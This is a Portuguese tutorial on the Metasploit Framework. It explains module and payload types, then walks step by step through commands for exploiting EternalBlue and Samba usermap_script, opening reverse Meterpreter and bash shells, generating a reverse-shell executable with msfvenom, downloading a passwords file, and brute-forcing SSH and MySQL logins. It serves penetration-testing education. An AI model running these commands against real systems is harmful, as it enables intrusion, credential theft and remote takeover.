Metasploit Framework

O framework de exploração mais usado no mundo — do reconhecimento à pós-exploração

🔗 Site oficial 📖 Documentação 📦 GitHub

O que é o Metasploit?

O Metasploit Framework é um framework de segurança ofensiva modular, originalmente criado por H.D. Moore em 2003 e adquirido pela Rapid7 em 2009. É mantido como projeto open source (Metasploit Framework) e como produto comercial (Metasploit Pro). Oferece uma base de exploits públicos, payloads (incluindo o agente em memória Meterpreter), encoders e módulos auxiliares que o operador encadeia para validar vulnerabilidades, desenvolver provas de conceito e conduzir testes de intrusão autorizados.

A arquitetura é baseada em módulos — unidades independentes que executam tarefas específicas. O msfconsole é a interface principal, enquanto o msfvenom gera payloads independentes.

Tipos de Módulos

O Metasploit organiza o seu conteúdo em categorias de módulos, cada uma com um propósito distinto.

Tipo Descrição Exemplo
Exploit Aproveita uma vulnerabilidade para executar código arbitrário no alvo. exploit/windows/smb/ms17_010_eternalblue
Auxiliary Não explora, mas faz reconhecimento, scanning, fuzzing ou administração. auxiliary/scanner/http/title
Payload Código executado no alvo após exploração bem-sucedida. windows/x64/meterpreter/reverse_tcp
Post Executado após comprometer a máquina — coleta, enumeração, escalação. post/windows/gather/hashdump
Encoder Ofuscação de payloads para evasão de antivírus. x86/shikata_ga_nai
Nops Preenchimento no-op para exploits de buffer overflow. —
Evasion Bypass de controlos de segurança. —

Tipos de Payload

Os payloads classificam-se pela forma como são entregues e executados:

Tipo Descrição
Singles Autocontidos, sem staging. Ex: windows/shell_reverse_tcp, linux/x86/shell_bind_tcp.
Stagers Pequenos, estabelecem a conexão e descarregam o stage maior. Ex: windows/meterpreter/reverse_tcp.
Stages Descarregados pelo stager, fornecem funcionalidade completa. Ex: Meterpreter, VNC, shell.
Adapters Modificam comportamento conforme o alvo; usados para evasão.

Convenção de nomenclatura: [plataforma]/[arquitetura]/[tipo]/[conexão] — por exemplo windows/x64/meterpreter/reverse_tcp.

Instalação

Kali Linux (pré-instalado)

O Metasploit já vem com o Kali. Basta abrir o terminal:

msfconsole

Linux/macOS (instalação oficial)

Descarrega o instalador em metasploit.com/download [citation:4].

Atualizar Kali

sudo apt update && sudo apt upgrade -y

Exemplos de Uso — do Reconhecimento à Pós-Exploração

1. Iniciar o console

Início
msfconsole

Abre o prompt msf6 >. Todos os comandos abaixo são executados aqui.

2. Pesquisar módulos

Reconhecimento
search type:exploit platform:windows smb

Pesquisa por exploits Windows SMB. Podes filtrar por type, platform, rank, cve.

search cve:2017-0144

Pesquisa por CVE específico (EternalBlue).

3. Selecionar um exploit

Exploração
use exploit/windows/smb/ms17_010_eternalblue

O prompt muda para msf6 exploit(windows/smb/ms17_010_eternalblue) >. Este é o módulo EternalBlue (MS17-010, CVE-2017-0144).

4. Ver e configurar opções

show options

Lista todas as opções necessárias e os seus valores atuais.

set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

Define o alvo, o teu IP (para reverse connection) e a porta de escuta.

5. Selecionar payload

Exploração
show payloads

Lista payloads compatíveis com o exploit selecionado.

set PAYLOAD windows/x64/meterpreter/reverse_tcp

Meterpreter é um agente avançado em memória com funcionalidades de pós-exploração.

6. Verificar vulnerabilidade

check

Alguns módulos suportam check — verifica se o alvo é vulnerável sem o explorar.

7. Executar o exploit

Exploração
exploit

Ou run. Se bem-sucedido, obtém uma sessão Meterpreter: meterpreter >.

8. Sessão Meterpreter — Info básica

Pós-Exploração
sysinfo
getuid
getpid

Obtém informações do sistema, utilizador atual e PID.

9. Meterpreter — Ficheiros

Pós-Exploração
pwd && ls
download C:\\Users\\Admin\\passwords.txt /tmp/
upload /tmp/tool.exe C:\\temp\\

Navegação e transferência de ficheiros.

10. Meterpreter — Processos

Pós-Exploração
ps
migrate 1234

Lista processos e migra para outro processo (útil para persistência e evasão).

11. Meterpreter — Rede

Pós-Exploração
ipconfig
netstat
route

Informação de rede do alvo comprometido.

12. Auxiliary — Scan HTTP

Reconhecimento
use auxiliary/scanner/http/title
set RHOSTS google.com
run

Extrai o título HTTP de um servidor. Auxiliary não requer payload.

13. Auxiliary — Brute-force SSH

Reconhecimento
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE users.txt
set PASS_FILE rockyou.txt
run

Testa credenciais SSH com listas de utilizadores e passwords.

14. Auxiliary — Brute-force MySQL

Reconhecimento
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.111
set user_file users.txt
set pass_file passwords.txt
run

Testa credenciais MySQL.

15. Samba usermap_script RCE

Exploração
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.102
set payload cmd/unix/reverse_bash
set LHOST 192.168.1.50
run

Explora o Samba "username map script" (portas 139/445).

16. Gerar payload com msfvenom

Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

Gera um executável Windows standalone. Depois é preciso um handler para receber a conexão.

17. Handler para receber sessão

Payload
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
run -j

Executa em background (-j) à espera da conexão do payload gerado.

18. Gerir sessões

Pós-Exploração
sessions -l

Lista sessões ativas.

sessions -i 1

Interage com a sessão de ID 1.

Cheat Sheet rápido

msfconsole Iniciar o console
search type:exploit smb Pesquisar exploits SMB
use <módulo> Selecionar módulo
show options Ver opções do módulo
set RHOSTS <alvo> Definir alvo
set PAYLOAD <payload> Definir payload
exploit / run Executar módulo
sessions -l Listar sessões ativas
